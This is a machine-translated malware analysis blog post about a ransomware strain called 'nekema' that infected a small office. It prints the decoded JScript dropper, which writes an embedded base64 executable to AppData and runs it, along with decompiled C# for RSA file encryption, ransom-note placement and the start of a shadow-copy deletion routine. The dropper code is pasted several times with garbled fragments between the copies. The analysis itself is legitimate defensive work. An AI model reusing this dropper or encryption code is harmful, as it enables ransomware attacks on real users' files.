<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>We pick a cryptograph, let's call it - ‚Äúnekema‚Äù</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="So, the next crypto-fiber encrypted files in a small office, the standard problem of our time. I came to see, and a miracle happened - the letter with...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>We pick a cryptograph, let's call it - ‚Äúnekema‚Äù</h1><div class="post__text post__text-html js-mediator-article"><div style="text-align:center;"><img src="https://habrastorage.org/webt/sl/tk/zn/sltkzn6vhdlcfu93xo6ztjo-688.jpeg"></div><br>  So, the next <b>crypto-fiber</b> encrypted files in a small office, the standard problem of our time.  I came to see, and a miracle happened - the letter with the infection was not deleted.  I wrote down the link from which the file with the infection is being loaded, gave a lecture on the importance of backups, transferred the infected files to a separate folder until better times and left the frustrated accountants. <br><br>  At home I decided to see how the infection occurs, and analyze, maybe there is a chance to recover the data.  What came of it - under the cut, welcome! <br><a name="habracut"></a><br><h3>  Infection </h3><br>  Delivery of the crypto-fiber - by email, the letter looks like a business, it is clear that the point delivery is for a specific office, an email is available on the organization's website  The letter as if attaches a file in the archive format * .rar with the name ‚ÄúAct of verification No. 317 generated by any accountant, is 1C 09112017.rar‚Äù, but in fact, when you hover the cursor on the file, you can see that the file was placed on the file storage bitly.com as a short link, the link does not cite, for obvious reasons.  The link leads to the real archive "act of reconciliation ‚Ññ317 formed 1C 09112017.rar".  Inside the archive - ‚Äúfile verification report No. 317 formed 1 09112017.wsf‚Äù, which was launched, which led to file encryption.  The result - the files have become the form - "% file name%.% File extension% .t20ajvx21j" - example: "Koala.jpg.t20ajvx21j".  On the desktop, the files "HOW - TO - RETURN - YOUR - FILES.jpg" - contains information with instructions (picture in the title) and "ssda.far" - the purpose of the file will be described below, as well as the list of extensions. <br>  As described in the instructions sent files to the specified address, naturally took the most important file.  In response, quite quickly a letter arrived with the decrypted file and the requirement to transfer the amount in the amount of 0.03 btc, at the exchange rate at that time 12,390 rubles.  Accountants estimated losses, and decided not to pay the extortionist, the benefit that 1C has already been transferred to the cloud.  And the rest of the files were duplicated.  Cost a little blood. <br><br>  Kaspersky Free was installed on the victim's computer, but he didn‚Äôt say anything. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h3>  Script - content and analysis </h3><br>  So the file: "file verification report No. 317 formed 1 09112017.wsf".  The size is 141,693 bytes. <br>  I will give a small code so that it is clear what we are dealing with: <br><br><div class="spoiler">  <b class="spoiler_title">Script source code - reduced.</b> <div class="spoiler_text"><pre><code class="javascript hljs">&lt;job id=<span class="hljs-string"><span class="hljs-string">"EVHQQ"</span></span>&gt; <span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">language</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"JScript.Encode"</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="undefined"><span class="xml"><span class="undefined"> #@~^GikCAA==&amp;JeMCeCeeCeCMeCeMeCeMMCeeCMeCeeCMMeCeCeMeMMCeMeCMeCeMM@#@&amp;\C.,ls']vtk^MWkWB3B6ORoHJf}HvSE4k 4m/++*v~E Um.k2Oc?4+^sBBB)9}fA jDDnlsvBBd4+^VRmwask1lOkKxvDp@#@&amp;7CD,fH}~xP +SP)mOr7+pr(%+1YcC^$!Dbp@#@&amp;\m.,2J}P{Pftrc^D lO+AVnh xYvEl6;lrbI@#@&amp;\wnxD- .......... </span></span></span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span><span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">job</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span></code> </pre> </div></div><br>  The file is encrypted using JScript.Encode and is not readable.  The tool found on Github was used for decryption - <a href="https://gist.github.com/bcse/1834878">Windows Script Decoder 1.8</a> <br><br>  After decrypting, we got a readable file: <br><br><div class="spoiler">  <b class="spoiler_title">Decrypted script - reduced.</b> <div class="spoiler_text"><pre> <code class="javascript hljs">&lt;job id=<span class="hljs-string"><span class="hljs-string">"EVHQQ"</span></span>&gt; <span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">language</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"JScript.Encode"</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="actionscript"><span class="xml"><span class="actionscript"> </span></span><span class="hljs-comment"><span class="xml"><span class="actionscript"><span class="hljs-comment">//**************************************************** var al=['Microso'+'ft.XMLDOM','bin.base64','WScript.Shell','ADODB.Stream','shell.application']; var DMO = new ActiveXObject(al[0]); var ELO = DMO.createElement("afqa"); vFP=rvpa(); ELO.dataType = al[1]; if (vFP==3.5) {ELO.text = gvp3()} else {ELO.text = gvp4()} ELO.text = gvp4(); ELO.text=ELO.text.substring(8); var dot= ELO.nodeTypedValue; sfile(); strt(noome2); function gvp3(){ var t="ASTADA//TVqQAAMAAAAEAAAA//G4AZQBrAGUAegAxAC4AZQB4AGUAAAAAAC4ABwABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAAbgBlAGsAZQBtAGEAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ....  .... "; return t; } function setname(){ if (vFP==3.5) {var sn='eselp3.ax'} else {sn='eselp4.ax'} return sn; } function strt(n){ W1S = new ActiveXObject(al[2]); W1S.Run('cmd.exe /C '+n, 0, false); } function sfile(){ var foso = new ActiveXObject(al[2]); noome2 = foso.ExpandEnvironmentStrings("%AppData%")+"\\"+setname(); var aod=new ActiveXObject(al[3]); aod.Type=1; aod.open(); aod.write(dot); aod.saveToFile(noome2,2); aod.close(); } function gvp4(){ var t="ASTADA//TVqQAAMAAAAEAAAA//QBtAGEALgBlAHgAZQAAAAAALgAHAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABuAGUAawBlAG0AYQAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAAAAwAAADIMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ....  .... AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="; return t; } function rvpa(){ var wFRI= 0x10; var wFFO= 0x20; var rv=4; var oWS= GetObject("winmgmts:\\\\.\\root\\CIMV2"); var cItems = oWS.ExecQuery("SELECT * FROM Win32_OperatingSystem", "WQL", wFRI | wFFO); var eItems = new Enumerator(cItems); var objItem = eItems.item(); if (objItem.Caption.indexOf('Windows 7')&gt;0) rv=3.5; if (objItem.Caption.indexOf('Windows 2003')&gt;0) rv=3.5; if (objItem.Caption.indexOf('Windows 2000')&gt;0) rv=3.5; if (objItem.Caption.indexOf('Windows XP')&gt;0) rv=3.5; if (objItem.Caption.indexOf('Windows Vista')&gt;0) rv=3.5; return rv; } </span></span></span></span></span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span> &lt;<span class="hljs-regexp"><span class="hljs-regexp">/job&gt;</span></span></code> G4AZQBrAGUAegAxAC4AZQB4AGUAAAAAAC4ABwABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAAbgBlAGsAZQBtAGEAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA <code class="javascript hljs">&lt;job id=<span class="hljs-string"><span class="hljs-string">"EVHQQ"</span></span>&gt; <span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">language</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"JScript.Encode"</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="actionscript"><span class="xml"><span class="actionscript"> </span></span><span class="hljs-comment"><span class="xml"><span class="actionscript"><span class="hljs-comment">//**************************************************** var al=['Microso'+'ft.XMLDOM','bin.base64','WScript.Shell','ADODB.Stream','shell.application']; var DMO = new ActiveXObject(al[0]); var ELO = DMO.createElement("afqa"); vFP=rvpa(); ELO.dataType = al[1]; if (vFP==3.5) {ELO.text = gvp3()} else {ELO.text = gvp4()} ELO.text = gvp4(); ELO.text=ELO.text.substring(8); var dot= ELO.nodeTypedValue; sfile(); strt(noome2); function gvp3(){ var t="ASTADA//TVqQAAMAAAAEAAAA//G4AZQBrAGUAegAxAC4AZQB4AGUAAAAAAC4ABwABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAAbgBlAGsAZQBtAGEAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ....  .... "; return t; } function setname(){ if (vFP==3.5) {var sn='eselp3.ax'} else {sn='eselp4.ax'} return sn; } function strt(n){ W1S = new ActiveXObject(al[2]); W1S.Run('cmd.exe /C '+n, 0, false); } function sfile(){ var foso = new ActiveXObject(al[2]); noome2 = foso.ExpandEnvironmentStrings("%AppData%")+"\\"+setname(); var aod=new ActiveXObject(al[3]); aod.Type=1; aod.open(); aod.write(dot); aod.saveToFile(noome2,2); aod.close(); } function gvp4(){ var t="ASTADA//TVqQAAMAAAAEAAAA//QBtAGEALgBlAHgAZQAAAAAALgAHAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABuAGUAawBlAG0AYQAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAAAAwAAADIMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ....  .... AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="; return t; } function rvpa(){ var wFRI= 0x10; var wFFO= 0x20; var rv=4; var oWS= GetObject("winmgmts:\\\\.\\root\\CIMV2"); var cItems = oWS.ExecQuery("SELECT * FROM Win32_OperatingSystem", "WQL", wFRI | wFFO); var eItems = new Enumerator(cItems); var objItem = eItems.item(); if (objItem.Caption.indexOf('Windows 7')&gt;0) rv=3.5; if (objItem.Caption.indexOf('Windows 2003')&gt;0) rv=3.5; if (objItem.Caption.indexOf('Windows 2000')&gt;0) rv=3.5; if (objItem.Caption.indexOf('Windows XP')&gt;0) rv=3.5; if (objItem.Caption.indexOf('Windows Vista')&gt;0) rv=3.5; return rv; } </span></span></span></span></span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span> &lt;<span class="hljs-regexp"><span class="hljs-regexp">/job&gt;</span></span></code> QBtAGEALgBlAHgAZQAAAAAALgAHAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABuAGUAawBlAG0AYQAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAAAAwAAADIMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA <code class="javascript hljs">&lt;job id=<span class="hljs-string"><span class="hljs-string">"EVHQQ"</span></span>&gt; <span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">language</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"JScript.Encode"</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="actionscript"><span class="xml"><span class="actionscript"> </span></span><span class="hljs-comment"><span class="xml"><span class="actionscript"><span class="hljs-comment">//**************************************************** var al=['Microso'+'ft.XMLDOM','bin.base64','WScript.Shell','ADODB.Stream','shell.application']; var DMO = new ActiveXObject(al[0]); var ELO = DMO.createElement("afqa"); vFP=rvpa(); ELO.dataType = al[1]; if (vFP==3.5) {ELO.text = gvp3()} else {ELO.text = gvp4()} ELO.text = gvp4(); ELO.text=ELO.text.substring(8); var dot= ELO.nodeTypedValue; sfile(); strt(noome2); function gvp3(){ var t="ASTADA//TVqQAAMAAAAEAAAA//G4AZQBrAGUAegAxAC4AZQB4AGUAAAAAAC4ABwABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAAbgBlAGsAZQBtAGEAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ....  .... "; return t; } function setname(){ if (vFP==3.5) {var sn='eselp3.ax'} else {sn='eselp4.ax'} return sn; } function strt(n){ W1S = new ActiveXObject(al[2]); W1S.Run('cmd.exe /C '+n, 0, false); } function sfile(){ var foso = new ActiveXObject(al[2]); noome2 = foso.ExpandEnvironmentStrings("%AppData%")+"\\"+setname(); var aod=new ActiveXObject(al[3]); aod.Type=1; aod.open(); aod.write(dot); aod.saveToFile(noome2,2); aod.close(); } function gvp4(){ var t="ASTADA//TVqQAAMAAAAEAAAA//QBtAGEALgBlAHgAZQAAAAAALgAHAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABuAGUAawBlAG0AYQAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAAAAwAAADIMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ....  .... AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="; return t; } function rvpa(){ var wFRI= 0x10; var wFFO= 0x20; var rv=4; var oWS= GetObject("winmgmts:\\\\.\\root\\CIMV2"); var cItems = oWS.ExecQuery("SELECT * FROM Win32_OperatingSystem", "WQL", wFRI | wFFO); var eItems = new Enumerator(cItems); var objItem = eItems.item(); if (objItem.Caption.indexOf('Windows 7')&gt;0) rv=3.5; if (objItem.Caption.indexOf('Windows 2003')&gt;0) rv=3.5; if (objItem.Caption.indexOf('Windows 2000')&gt;0) rv=3.5; if (objItem.Caption.indexOf('Windows XP')&gt;0) rv=3.5; if (objItem.Caption.indexOf('Windows Vista')&gt;0) rv=3.5; return rv; } </span></span></span></span></span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span> &lt;<span class="hljs-regexp"><span class="hljs-regexp">/job&gt;</span></span></code> </pre> <br></div></div><br>  Script work: <br><br>  al - stores an array of ActiveX object names that will be used in the script: <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> al=[<span class="hljs-string"><span class="hljs-string">'Microso'</span></span>+<span class="hljs-string"><span class="hljs-string">'ft.XMLDOM'</span></span>,<span class="hljs-string"><span class="hljs-string">'bin.base64'</span></span>,<span class="hljs-string"><span class="hljs-string">'WScript.Shell'</span></span>,<span class="hljs-string"><span class="hljs-string">'ADODB.Stream'</span></span>,<span class="hljs-string"><span class="hljs-string">'shell.application'</span></span>];</code> </pre><br>  A variable is accessed by an index - an example of ‚Äúal [1] means - bin.base64‚Äù <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> DMO = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ActiveXObject(al[<span class="hljs-number"><span class="hljs-number">0</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ELO = DMO.createElement(<span class="hljs-string"><span class="hljs-string">"afqa"</span></span>);</code> </pre><br>  The DMO object Microsoft.XMLDOM is created and in it creates an element node with the name ‚Äúafqa‚Äù in the ELO variable. <br><br><pre> <code class="javascript hljs">ELO.dataType = al[<span class="hljs-number"><span class="hljs-number">1</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (vFP==<span class="hljs-number"><span class="hljs-number">3.5</span></span>) {ELO.text = gvp3()} <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> {ELO.text = gvp4()} ELO.text = gvp4(); ELO.text=ELO.text.substring(<span class="hljs-number"><span class="hljs-number">8</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> dot= ELO.nodeTypedValue; sfile();</code> </pre><br>  Functions gvp3 () and gvp4 () - return text in which binary files are encoded using base64. <br><br>  The ELO element is assigned the data type - bin.base64 and, depending on the OS version, is assigned the value of the text = text field of the encoded binary file in base64 format. <br>  Then the text is copied from ELO to ELO starting from the 8th character.  Then the file is placed in the dot variable in the decoded form. <br><br>  The vFP variable stores the return value of the rvpa () function - which, depending on the version of Windows, returns rv = 4 for Windows 8 and higher, and for Windows XP- Windows 7 rv = 3.5. <br><br>  The sfile () function saves the file in the folder ‚ÄúC: \ Users \% user% \ AppData \ Roaming‚Äù with the name obtained from the setname () function - ‚Äúeselp3.ax‚Äù or ‚Äúeselp4.ax‚Äù depending on the variable rv. <br>  The full file name is placed in the variable "noome2" - "C: \ Users \% user% \ AppData \ Roaming \ eselp3.ax" <br><br>  Finally, calling the strt (noome2) function starts the file, using the 'cmd / c% path to the file%'. <br><br>  If you change the file extension to .exe, you can see the file properties: <br><br><div class="spoiler">  <b class="spoiler_title">Properties</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/6d/3q/_r/6d3q_rxg6sqvrlfgqnfvkne3ovo.jpeg"><br></div></div><br>  Here you can see the name of the source file "nekema". <br><br><h3>  Binary </h3><br>  The following tools were used for the analysis: <br>  .NET Reflector 9.0 <br>  SharpDevelop 4.3 <br><br>  Run Reflector and load the file.  We see the structure: <br><br><img src="https://habrastorage.org/webt/dc/oa/yj/dcoayjk1q527ogxqur3om7fv_ku.jpeg"><br><br>  We are interested in <b>nekez1</b> , we save the source code for analysis: <br><br><div class="spoiler">  <b class="spoiler_title">The source code Nekez1 left key functions for analysis.</b>  <b class="spoiler_title">Added comments to variables.</b> <div class="spoiler_text"><pre> <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 